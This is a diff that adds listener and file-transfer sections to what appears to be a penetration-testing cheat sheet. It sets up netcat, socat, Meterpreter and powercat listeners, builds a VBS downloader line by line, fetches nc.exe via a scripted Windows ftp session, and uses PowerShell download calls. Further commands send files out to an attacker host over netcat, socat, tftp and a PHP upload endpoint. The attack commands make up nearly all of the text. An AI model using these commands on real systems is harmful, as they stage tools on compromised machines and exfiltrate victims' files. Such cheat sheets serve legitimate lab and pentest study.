@@ -344,5 +344,164 @@ Use the following instead of just sudo <PROGRAM>
 ```
 sudo -u root <PATH TO PROGRAM>
 ```
- 
+
+## Listeners
+#### Netcat listener
+```
+sudo nc -nlvp <PORT>
+```
+
+#### Socat listener
+```
+sudo socat -d -d TCP4-LISTEN:<PORT> STDOUT
+```
+
+#### Meterpreter listener
+```
+msfconsole
+use multi/handler
+set payload <PAYLOAD>
+run
+```
+
+#### Powercat listener
+```
+. ./powercat.ps1
+powercat -l -v -p 10000
+```
+
+## File transfers
+### Download files
+#### Start webservers
+```
+sudo service apache2 start #files in /var/www/html
+sudo python3 -m http.server <PORT> #files in current directory
+```
+
+#### Download file from webserver
+```
+wget http://<IP>:<PORT>/<FILE>
+```
+
+#### Linux ftp
+```
+If installed use the ftp package
+```
+
+#### Windows ftp
+Use native program with the -s parameter to use a input file for the commands
+```
+echo open <IP> 21> ftp.txt
+echo USER <USER> >> ftp.txt
+echo lab>> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+```
+
+#### VBS download files for Windows XP
+Create vbs script
+```
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge
+t.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.
+vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET", strURL, False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+```
+
+Run VBS script to download file
+```
+cscript wget.vbs http://<IP>/<FILE> <FILE>
+```
+
+#### Powershell download file
+```
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/<FILE>', '<FILE>')
+```
+```
+powershell -c "Invoke-WebRequest -Uri 'http://<IP>/<FILE>' -OutFile 'C:\Windows\Temp\<FILE>'"
+```
+
+### Upload files
+#### Netcat listener for file
+```
+nc -nlvp 4444 > <FILE>
+```
+
+#### Netcat send file
+```
+nc -nv 10.11.0.22 4444 <FILE>
+```
+
+#### Socat listener for file
+```
+sudo socat TCP4-LISTEN:<PORT>,fork file:<FILE>
+```
+
+#### Socat send file
+```
+socat TCP4:<IP>:<PORT> file:<FILE>,create
+```
+
+#### Powercat send file
+```
+powercat -c <IP> -p <PORT> -i <FILE>
+```
+
+#### Upload Windows data through HTTP Post request
+make /var/www/upload.php on kali
+```
+<?php
+$uploaddir = '/var/www/';
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+```
+
+Upload file in Windows client
+```
+powershell (New-Object System.Net.WebClient).UploadFile('http://<IP>/upload.php', '<FILE>')
+```
+
+#### Upload through tftp (over udp)
+Install tftp on kali
+```
+sudo apt update && sudo apt install atftp
+sudo mkdir /tftp
+sudo chown nobody: /tftp
+sudo atftpd --daemon --port 69 /tftp
+```
+
+On windows client to send file
+```
+tftp -i 10.11.0.4 put important.docx
+```
+
+#### Powercat send file
+```
+powercat -c <IP> -p <PORT> -i <FILE>
+```
+
 ## Lateral movement
